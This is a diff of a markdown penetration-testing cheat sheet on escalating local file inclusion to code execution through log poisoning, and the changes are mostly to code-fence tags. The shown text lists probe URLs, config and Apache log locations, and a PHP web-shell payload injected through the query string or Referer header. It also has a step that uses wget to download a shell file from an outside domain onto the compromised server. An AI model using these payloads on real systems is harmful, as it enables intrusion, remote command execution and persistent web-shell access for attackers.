@@ -319,23 +319,22 @@ LFI vs LFD:
 
 Steps:
 1. Verify existence of LFI/LFD vulnerability.
-``` HTML
+```
 domain.com/?p=somepage.txt
 domain.com/?p=pagename-whatever
 domain.com/?class=something&function=another 
 ```
 
 2. Figure out where the logfiles are. Example locations:
-``` HTML
+```
 /usr/local/etc/php
 /etc/php.d/*.ini
 /etc/php5/cli/php.ini
 /usr/local/lib/php.ini
 /etc/php.ini
 ```
-
-Also check Apache logs:
-``` HTML
+  Also check Apache logs:
+```
 /var/log/apache2/access.log
 /var/log/httpd/error_log
 /var/log/apache2/error.log
@@ -348,13 +347,13 @@ Also check Apache logs:
   * Attack vectors:
      * URL query string: `example.com/?q=injectpaylod`
      * HTTP Headers: Referer header.
-``` PHP
+```
 <?php passthru($_GET['cmd']); ?>
 <?php passthru(['ls -l']); ?>
 ```
 
 4. With command execution, use wget to upload your own files to the server:
-``` SHELL
+```
 /var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
 OR
 <?php passthru(['w']); ?>
